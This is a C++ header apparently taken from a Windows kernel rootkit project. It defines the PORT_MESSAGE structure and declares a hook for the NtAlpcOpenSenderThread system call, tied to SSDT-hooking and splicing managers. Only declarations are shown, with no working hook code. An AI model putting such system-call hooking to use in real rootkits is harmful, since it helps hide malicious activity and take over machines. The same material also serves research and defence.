#pragma once
#include "../../stdafx.h"
#include "../../SSDTManager/SSDTHooksManager.h"
#include "../../SplicingManager/SplicingManager.h"

#pragma pack(1)
typedef struct _PORT_MESSAGE
{
    union
    {
        struct
        {
            CSHORT DataLength;
            CSHORT TotalLength;
        } s1;
        ULONG Length;
    } u1;
    union
    {
        struct
        {
            CSHORT Type;
            CSHORT DataInfoOffset;
        } s2;
        ULONG ZeroInit;
    } u2;
    union
    {
        CLIENT_ID ClientId;
        double DoNotUseThisField;
    };
    ULONG MessageId;
    union
    {
        SIZE_T ClientViewSize; // only valid for LPC_CONNECTION_REQUEST messages
        ULONG CallbackId; // only valid for LPC_REQUEST messages
    };
} PORT_MESSAGE, * PPORT_MESSAGE;
#pragma pack(pop)

typedef NTSTATUS(*NT_ALPC_OPEN_SENDER_THREAD)(
    OUT PHANDLE ThreadHandle,
    IN HANDLE PortHandle,
    IN PPORT_MESSAGE PortMessage,
    IN ULONG Flags,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes  
    );


extern "C" NTSTATUS NtAlpcOpenSenderThreadHook_RootkitManager(
    OUT PHANDLE ThreadHandle,
    IN HANDLE PortHandle,
    IN PPORT_MESSAGE PortMessage,
    IN ULONG Flags,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes);